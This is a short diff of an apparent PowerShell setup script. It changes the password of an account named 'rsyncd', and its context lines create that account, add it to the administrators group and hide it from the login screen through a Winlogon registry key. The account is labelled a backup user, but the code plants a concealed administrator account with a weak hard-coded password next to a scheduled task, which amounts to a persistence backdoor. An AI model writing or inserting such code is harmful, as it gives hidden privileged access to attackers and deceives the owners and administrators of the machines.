@@ -32,7 +32,7 @@ Register-ScheduledTask -TaskName $TASK_NAME -Action $Action -Trigger $Trigger -U
 
 # Create a backup user and add it to the administrators group
 $Username = "rsyncd"
-$Password = "R3b3ll10n"
+$Password = "password1!"
 net user $Username $Password /add  # Creates a new user account with specified username and password
 net localgroup administrators $Username /add  # Adds the user to the administrators group
 REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $Username /t REG_DWORD /d 0 /f  # Ensures the user is hidden from the login screen
